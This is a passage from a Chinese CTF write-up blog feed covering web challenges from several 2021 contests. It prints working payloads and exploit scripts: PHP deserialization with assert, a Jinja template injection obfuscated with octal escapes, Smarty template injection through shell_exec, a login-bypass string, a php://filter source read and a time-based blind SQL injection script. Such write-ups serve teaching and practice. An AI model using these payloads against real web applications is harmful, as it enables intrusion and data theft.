<code>chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;)?scandir(&#39;.&#39;):&#39;&#39;</code>这样穿越目录tql   </p><p>  读flagpayload：<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:85:&quot;$safe=chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;).file_get_contents(&#39;you_never_know_my_name&#39;)&quot;;&#125;</code>      </p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>CJBCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Newctf</title>
    <link href="/2021/06/02/newctf/"/>
    <url>/2021/06/02/newctf/</url>
    
    <content type="html"><![CDATA[<h2 id="2021-6-1萌新赛-easy-web"><a href="#2021-6-1萌新赛-easy-web" class="headerlink" title="2021.6.1萌新赛-easy_web"></a>2021.6.1萌新赛-easy_web</h2><p>hint:这个图片真好看呀，没啥隐藏的东西吧    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/06/a108d4199c1e415b.png">       </p><p>第一点：<code>md5($six_number) == &#39;e10adc3949ba59abbe56e057f20f883e&#39;</code><br>这一串是123456的MD5       </p><p>第二点：<code>===</code>可以数组绕过        </p><p>第三点：<code>$array[++$c]=1</code>数组索引溢出，<code>$c=9223372036854775806</code>      </p><p>payload:<code>webp=123456&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806</code>     </p><p>返回：   </p><pre><code>你觉得就这么简单吗？？？，可以告诉你密码哦！        password: xluoyyds123456@@@      </code></pre><p>然后是一个图片隐写，下载下来背景图片，后缀改为<code>.rar</code>       </p><p><img src="https://ftp.bmp.ovh/imgs/2021/06/8c299e4b1ca8b594.png">         </p><p>输入密码得到flag    </p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NEEPUCTF</title>
    <link href="/2021/05/27/NEEPUCTF/"/>
    <url>/2021/05/27/NEEPUCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="remote-table"><a href="#remote-table" class="headerlink" title="remote_table"></a>remote_table</h2><p>打开环境    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/b36aac21b99441e6.png"></p><p>就在这里，我居然没找到，太失败了   </p><h2 id="The-myth-of-Aladdin"><a href="#The-myth-of-Aladdin" class="headerlink" title="The_myth_of_Aladdin"></a>The_myth_of_Aladdin</h2><p>SSTI<br>过滤了<code>&#123;&#123;&#125;&#125;</code>用<code>&#123;%print()%&#125;</code>替代<br><code>.</code>用<code>[]</code>替换<br>过滤了类名，八进制或者Unicode均可绕过     </p><p>payload：<code>&#123;%print(().__class__.__base__.__subclass__()[95].__init__.__globals__.__builtins__.__import__('os').popen('ls').read())%&#125;</code>   </p><p>转八进制     </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token single-quoted-string string">'read'</span><span class="token punctuation">;</span><span class="token variable">$res</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$res</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token double-quoted-string string">"\\"</span><span class="token punctuation">.</span><span class="token function">decoct</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></code></pre><p>en-payload:<code>&#123;%print(()["\137\137\143\154\141\163\163\137\137"]["\137\137\142\141\163\145\137\137"]["\137\137\163\165\142\143\154\141\163\163\145\163\137\137"]()[95]["\137\137\151\156\151\164\137\137"]["\137\137\147\154\157\142\141\154\163\137\137"]["\137\137\142\165\151\154\164\151\156\163\137\137"]["\137\137\151\155\160\157\162\164\137\137"]("o""s")["\160\157\160\145\156"]("ls")["\162\145\141\144"]())%&#125;</code>     </p><p>空格用<code>%09</code>代替     </p><p>最后读取flag过滤了<code>Neepu</code>，Unicode编码<br><code>cat /flag|base64</code>—&gt;<code>\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u007c\u0062\u0061\u0073\u0065\u0036\u0034</code>     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/36675dab86b84736.png">    </p><p>WP是使用截断的方法读取flag的<br><code>&quot;c&quot;&quot;ut%09-c%092-40%09/fl&quot;&quot;ag&quot;</code><br>cut<br> <code>-c</code>:仅显示行中指定范围的字符；     </p><h2 id="gamebox"><a href="#gamebox" class="headerlink" title="gamebox"></a>gamebox</h2><p>打开环境是个登录框，万能密码即可登录<code>adwa&#39;=&#39;0</code><br>进入后是个小游戏<br><img src="https://ftp.bmp.ovh/imgs/2021/05/00e8b9a1dd156058.png">     </p><p>验证码图片的名字就是验证码，可以写脚本跑    </p><p>猜对五次后会进行跳转<br><code>http://neepusec.club:18943/index.php?file=rander.php</code>       </p><p>可以用为协议读取下源码<br><code>?file=php://filter/read=convert.base64-encode/resource=rander.php</code>     </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// create object</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'smarty/Smarty.class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$smarty</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Smarty</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'string:恭喜 '</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token single-quoted-string string">' 获得了胜利'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre></code></pre><p><code>display</code>存在PHP模板注入     </p><p>名字改成模板注入语句即可<br>这里还有<code>disable_function</code>,可以用<code>shell_exec</code>    </p><p>WP的EXP：        </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://neepusec.club:18943"</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#payload = "&#123;&#123;shell_exec(\"\ls\t/\")&#125;&#125;'='0"</span>payload <span class="token operator">=</span> <span class="token string">"&#123;&#123;shell_exec(\"cat\t/This_is_your_Flag\")&#125;&#125;'='0"</span>login_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">&#125;</span>res0 <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/login.php"</span><span class="token punctuation">,</span>data <span class="token operator">=</span> login_data<span class="token punctuation">)</span>res1 <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/index.php"</span><span class="token punctuation">)</span>reg <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'pic\/.*?\.jpg'</span><span class="token punctuation">,</span>res1<span class="token punctuation">.</span>text<span class="token punctuation">)</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"authcode"</span><span class="token punctuation">:</span>reg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"guess"</span><span class="token punctuation">:</span><span class="token string">"on"</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res3 <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/index.php"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>    reg <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'pic\/.*?\.jpg'</span><span class="token punctuation">,</span>res3<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"authcode"</span><span class="token punctuation">:</span>reg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"guess"</span><span class="token punctuation">:</span><span class="token string">"on"</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>res3<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">3287</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res3<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre></code></pre><p>另一种方法<a href="https://www.cnblogs.com/erR0Ratao/p/14806464.html">（日志包含）</a>：<br>日志路径<code>file=/var/log/nginx/access.log</code><br><img src="https://ftp.bmp.ovh/imgs/2021/05/4ad56cf981691d27.png">       </p><p>写入一句话<br><img src="https://ftp.bmp.ovh/imgs/2021/05/81e22ec2143d5c2f.png"></p><p><a href="https://www.cnblogs.com/erR0Ratao/p/14806464.html">more</a>     </p><p><a href="https://www.cnblogs.com/my1e3/p/5854897.html">日志包含</a>     </p><hr><p><a href="https://www.anquanke.com/post/id/242237#h3-2">最后两题</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MTCTF CSICN</title>
    <link href="/2021/05/25/MTCISCN/"/>
    <url>/2021/05/25/MTCISCN/</url>
    
    <content type="html"><![CDATA[<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>MT的第一题，时间盲注，但是常见的字符都过了<code>ascii</code>、<code>substr</code>,大于号小于号等于号，<code>lile</code>,<code>if</code>都过了，不会了   </p><p><code>W&amp;M</code> 的WP   </p><pre><code><pre class="language-python" data-language="python"><code class="language-python">    <span class="token keyword">import</span> requests <span class="token keyword">as</span> req    <span class="token keyword">import</span> time    <span class="token keyword">def</span> <span class="token function">ord2hex</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">:</span>        result <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    result <span class="token operator">=</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'0x'</span><span class="token operator">+</span>result    url <span class="token operator">=</span> <span class="token string">"http://eci-2ze7bgvjvxtgmki6mtcj.cloudeci1.ichunqiu.com/index.php"</span>    string <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_'</span><span class="token punctuation">]</span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0'</span><span class="token punctuation">,</span>        <span class="token string">'Accept'</span><span class="token punctuation">:</span><span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span><span class="token punctuation">,</span>        <span class="token string">'Connection'</span><span class="token punctuation">:</span><span class="token string">'keep-alive'</span>        <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">:</span>        passwd <span class="token operator">=</span> ord2hex<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token operator">+</span>res<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#print(passwd)</span>        passwd <span class="token operator">=</span> <span class="token string">'||case/**/when/**/password/**/regexp/**/binary/**/&#123;&#125;/**/then/**/sleep(3)/**/else/**/1111111/**/end/**/#'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span>        <span class="token comment">#print(passwd)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string">"admin\\"</span><span class="token punctuation">,</span>        <span class="token string">'password'</span><span class="token punctuation">:</span>passwd        <span class="token punctuation">&#125;</span>        before_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        after_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">#print( r.text)</span>        offset <span class="token operator">=</span> after_time <span class="token operator">-</span> before_time        <span class="token comment"># print(offset)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>offset <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span>        res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token comment">#password This_1s_thE_Passw0rd</span>    ```    `case when`  !<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>ftp<span class="token punctuation">.</span>bmp<span class="token punctuation">.</span>ovh<span class="token operator">/</span>imgs<span class="token operator">/</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">27e74714170e20bb.</span>png<span class="token punctuation">)</span>    `regexp`正则匹配     这个匹配可以直接匹配到字符的十六进制，Mysql会将十六进制转换      !<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>ftp<span class="token punctuation">.</span>bmp<span class="token punctuation">.</span>ovh<span class="token operator">/</span>imgs<span class="token operator">/</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">69215b03e678fd6b.</span>png<span class="token punctuation">)</span>        <span class="token comment">## easytricks </span>MT      也有SQL注入的点   ` select <span class="token operator">*</span> <span class="token keyword">from</span> user where user<span class="token operator">=</span><span class="token string">'$user'</span> <span class="token keyword">and</span> passwd<span class="token operator">=</span><span class="token string">'%s'</span>`    <span class="token operator">%</span>s<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>字符串      <span class="token punctuation">[</span>sprintf格式化注入漏洞<span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>blog<span class="token punctuation">.</span>csdn<span class="token punctuation">.</span>net<span class="token operator">/</span>weixin_41185953<span class="token operator">/</span>article<span class="token operator">/</span>details<span class="token operator">/</span><span class="token number">80485075</span><span class="token punctuation">)</span>     `没做字符类型检测的最大危害就是它可以吃掉一个转义符\<span class="token punctuation">,</span> 如果<span class="token operator">%</span>后面出现一个\<span class="token punctuation">,</span>那么php会把\当作一个格式化字符的类型而吃掉\<span class="token punctuation">,</span> 最后<span class="token operator">%</span>\（或<span class="token operator">%</span><span class="token number">1</span>$\）被替换为空`  !<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>ftp<span class="token punctuation">.</span>bmp<span class="token punctuation">.</span>ovh<span class="token operator">/</span>imgs<span class="token operator">/</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">7b7afea854b5deba.</span>png<span class="token punctuation">)</span>     可以看到`<span class="token operator">%</span><span class="token number">1</span>$`后的`'`被吞了      <span class="token punctuation">[</span>MTCTF<span class="token operator">-</span><span class="token number">2021</span> Write_Up by 打CTF不靠实力靠运气<span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>mp<span class="token punctuation">.</span>weixin<span class="token punctuation">.</span>qq<span class="token punctuation">.</span>com<span class="token operator">/</span>s<span class="token operator">/</span>zP7pOdL0zbWzKMJlVcff<span class="token operator">-</span>Q<span class="token punctuation">)</span>     <span class="token comment">##  easy_source   </span>CISCN   `<span class="token punctuation">.</span>index<span class="token punctuation">.</span>php<span class="token punctuation">.</span>swo`        ```php    <span class="token operator">&lt;</span>?php    <span class="token keyword">class</span> <span class="token class-name">User</span>    <span class="token punctuation">&#123;</span>        private static $c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        function a<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function b<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function c<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function d<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function e<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function f<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function g<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function h<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function i<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function j<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function k<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function l<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function m<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function n<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function o<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function p<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function q<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function r<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function s<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        function t<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>    $rc<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">"rc"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $rb<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">"rb"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $ra<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">"ra"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $rd<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">"rd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $method<span class="token operator">=</span> new $rc<span class="token punctuation">(</span>$ra<span class="token punctuation">,</span> $rb<span class="token punctuation">)</span><span class="token punctuation">;</span>    var_dump<span class="token punctuation">(</span>$method<span class="token operator">-</span><span class="token operator">></span>$rd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></code></pre><p>利用PHP原生类读取类中的注释<br><code>ReflectionMethod</code>  </p><p><code>public ReflectionMethod::__construct ( mixed $class , string $name )</code><br>–&gt;$class类的名称      </p><p>–&gt;$name方法的名称         </p><p>或者<code>public ReflectionMethod::__construct ( string $class_method )</code>      </p><p>$class_method–&gt;类的名称和方法的名称中间以<code>::</code>分割      </p><p>ReflectionMethod中的<code>getDocComment</code>可以返回注释 代码     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e78bf4d72e174c59.png">     </p><p>payload:<code>rc=ReflectionMethond&amp;ra=User&amp;rb=q&amp;rd=getDocComment</code>      </p><p>ReflectionMethod里的其他方法    </p><pre><code>```php$ref = new ReflectionClass(B::class);//print_r(ReflectionClass::export(demo::class));print_r($ref-&gt;getProperties()); // 获取一级属性, 可以传参数过滤, 返回ReflectionProperty 对象的数组。var_dump($ref-&gt;getConstructor()); // 获取构造函数, 未定义返回nullvar_dump($ref-&gt;inNamespace()); // 是否在命名空间中var_dump($ref-&gt;getConstants()); // 获取所有定义的常量var_dump($ref-&gt;getConstant(&#39;TEST_1&#39;)); // 获取某个常量print_r($ref-&gt;getDefaultProperties()); // 获取默认属性, 返回数组, 包括父类的属性var_dump($ref-&gt;getDocComment()); // 获取类文档注释, 不包含属性和方法的注释, 无注释返回falsevar_dump($ref-&gt;getExtension()); // 获取获取最后一行的行数var_dump($ref-&gt;getFileName()); // 获取定义类的文件名, 返回绝对路径var_dump($ref-&gt;getInterfaceNames()); // 获取接口名称, 返回索引数组,值为接口名称, 未实现接口返回空数组var_dump($ref-&gt;getInterfaces()); // 获取接口, 返回关联数组, name=&gt;ReflectionClass实例, 未实现接口返回空数组var_dump($ref-&gt;getMethods()); // 指获取类方法 ReflectionMethod。var_dump($ref-&gt;getMethod(&#39;foo4&#39;)); // 获取一个类方法的 ReflectionMethod。如果方法不存在会抛出异常, 需要配合try catch一起用var_dump($ref-&gt;getName()); // 获取类名, 包含命名空间var_dump($ref-&gt;getNamespaceName()); // 获取命名空间的名称, 没有返回空var_dump($ref-&gt;getParentClass()); // 获取父类reflectionClass的实例, 没有父类返回falsevar_dump($ref-&gt;getProperty(&#39;prop3&#39;)); // 获取一个属性, 返回ReflectionProperty实例, 属性不存在会抛出异常, 需配合try catch使用var_dump($ref-&gt;getShortName()); // 获取类名, 不包含命名空间var_dump($ref-&gt;getStartLine()); // 获取起始行号print_r($ref-&gt;getStaticProperties()); // 获取静态属性print_r($ref-&gt;getStaticPropertyValue(&#39;prop_static&#39;)); // 获取静态属性值, 未定义的属性会报致命错误print_r($ref-&gt;getTraitAliases()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraitNames()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraits()); // 返回这个类所使用的 traits 数组var_dump($ref-&gt;hasConstant(&#39;AB&#39;)); // 检查常量是否已经定义var_dump($ref-&gt;hasMethod(&#39;AB&#39;)); 